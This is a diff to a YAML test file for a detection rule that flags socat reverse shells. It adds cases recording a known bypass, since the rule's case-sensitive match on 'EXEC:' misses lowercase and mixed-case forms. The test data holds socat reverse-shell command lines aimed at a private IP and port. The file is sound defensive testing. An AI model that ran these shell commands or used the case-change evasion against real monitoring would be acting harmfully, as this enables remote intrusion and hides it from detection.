@@ -12,6 +12,21 @@ tests:
         nr: 59
     expect: alert
     expect_severity: critical
+    mutants:
+      # issue #30: encoding/obfuscation bypass — the rule matches "EXEC:"
+      # with a case-sensitive `contains` operator (condOpContains uses
+      # strings.Contains, not EqualFold; see internal/correlator/rules.go).
+      # Lowercasing the directive is a trivial evasion.
+      - description: "lowercase 'exec:' directive evades case-sensitive contains match"
+        patch:
+          proc_args: "socat TCP:10.0.0.1:4444 exec:sh"
+        expect: no_alert
+        known_bypass: true
+      - description: "mixed-case 'Exec:' directive also evades the match"
+        patch:
+          proc_args: "socat TCP:10.0.0.1:4444 Exec:sh"
+        expect: no_alert
+        known_bypass: true
 
   - name: "socat with EXEC:bash fires lolbin_socat_shell"
     rule_id: lolbin_socat_shell
